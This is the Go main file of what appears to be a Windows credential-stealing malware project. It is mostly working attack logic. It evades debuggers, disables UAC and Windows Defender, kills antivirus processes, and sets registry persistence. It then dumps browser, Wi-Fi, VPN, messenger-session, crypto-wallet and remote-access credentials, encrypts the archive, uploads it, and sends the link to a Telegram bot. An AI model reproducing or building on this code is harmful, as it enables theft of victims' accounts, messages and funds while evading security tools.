//go:build windows

package main

import (
	"errors"
	"os"
	"path/filepath"
	"sync"
	"vortex/antiav"
	"vortex/browser"
	"vortex/cryptowallets"
	"vortex/datatransfer"
	"vortex/envtype"
	"vortex/hutil"
	"vortex/install"
	"vortex/messenger"
	"vortex/opsysinfo"
	"vortex/softwares"
	"vortex/telehandler"
	"vortex/vpn"
	"vortex/wifi"
)

func main() {

	telehandler.Token = ""
	telehandler.ChatId = ""

	var (
		encryptionKey     string = "VMWUvTmdKdRt0Cbja1uJg"
		mainFolder        string = install.DataDumpLocation()
		finalDataDumpFile string = opsysinfo.PublicIPInfo().CountryCode + "_" + opsysinfo.MachineSpecs().HostID + ".zip"
		wg                sync.WaitGroup
	)

	wg.Add(7)

	//Check if running inside debugger before start
	debug, err := envtype.DetectDebugging()
	if err != nil {
		hutil.LogTrace(mainFolder, err)
		os.Exit(400)
	}
	if debug {
		os.Exit(400)
	}

	antiav.DisableUAC()
	antiav.DisableWDInitiate()

	//Analysis protection
	go func() {
		defer wg.Done()
		if err := envtype.Protector(); err != nil {
			hutil.LogTrace(mainFolder, err)
		}
	}()

	//Av running procs terminate
	go func() {
		defer wg.Done()
		antiav.AvProcs()
	}()

	//Telegram Commands
	go func() {
		defer wg.Done()
		telehandler.ClientCommands()
	}()

	//Core Data Dump Initialize
	go func() {
		defer wg.Done()
		if install.ProcessLock() {
			os.Exit(700)
		}
		if err = install.InstallPersistence(); err != nil {
			hutil.LogTrace(mainFolder, errors.New("Unable to set registry key: "+err.Error()))
		}

		// Chromium and Gecko based browsers
		browser.RecursiveChromiumBrowserDump(mainFolder)
		browser.RecursiveGeckoBrowserDump(mainFolder)

		// Wifi Passwords
		if err = wifi.DumpWifiPasswords(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("WIFI: "+err.Error()))
		}

		// VPN configs
		if err = vpn.OpenvpnConfigCoping(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("VPN: "+err.Error()))
		}

		if err = vpn.ProtonvpnConfigCoping(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("PROTON: "+err.Error()))
		}
		if err = vpn.NordvpnConfigCoping(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("NORD: "+err.Error()))
		}

		// Discord
		if err = messenger.DiscordDataDump(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("Discord: "+err.Error()))
		}

		// Element
		if err = messenger.GetElementSession(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("Element: "+err.Error()))
		}

		// Signal
		if err = messenger.GetSignalSession(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("Signal: "+err.Error()))
		}

		// Skype
		if err = messenger.GetSkypeSession(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("Skype: "+err.Error()))
		}

		// Telegram
		if err = messenger.GetTelegramProcessPath(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("TELEGRAM-PROC: "+err.Error()))
		} else if err = messenger.GetTelegramDefaultPath(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("TELEGRAM-DEF: "+err.Error()))
		}

		// Whatsapp
		if err = messenger.GetWhatsappSession(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("Whatsapp: "+err.Error()))
		}

		//CryptoWallets Dump
		if err = cryptowallets.CryptoWalletsDump(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("CW: "+err.Error()))
		}

		//CryptoWallets Extensions Dump
		if err = cryptowallets.CryptoWalletsExtDump(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("CXW: "+err.Error()))
		}

		//Putty Dump
		if err = softwares.PuttyDataQuery(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("PUTTY: "+err.Error()))
		}

		//WinSCP Dump
		if err = softwares.WinSCPDataQuery(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("WINSCP: "+err.Error()))
		}

		//Teamviewer Dump
		if err = softwares.TeamviewerDumpPass(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("TEAMVIEWER: "+err.Error()))
		}

		//FileZilla Dump
		if err = softwares.FilezillaServersData(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("FZILLA: "+err.Error()))
		}

		//Steam Dump
		if err = softwares.SteamDataDump(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("STEAM: "+err.Error()))
		}

		//Uplay Dump
		if err = softwares.UplayDataDump(mainFolder); err != nil {
			hutil.LogTrace(mainFolder, errors.New("UPLAY: "+err.Error()))
		}

		if err = hutil.CompressDataFiles(mainFolder, finalDataDumpFile, encryptionKey); err != nil {
			hutil.LogTrace(mainFolder, err)
		}

		fileUpload, err := datatransfer.UploadDataDump(mainFolder, finalDataDumpFile)
		if err != nil {
			hutil.LogTrace(mainFolder, errors.New("File Upload: "+err.Error()))
		}
		if fileUpload.DownloadURL != "" {
			if err = telehandler.SendMessage(fileUpload.DownloadURL); err != nil {
				hutil.LogTrace(mainFolder, errors.New("File Upload: "+err.Error()))
			}
		}
		install.ProcessUnlock()
		os.Remove(filepath.Join(mainFolder, finalDataDumpFile))
	}()

	wg.Wait()
}
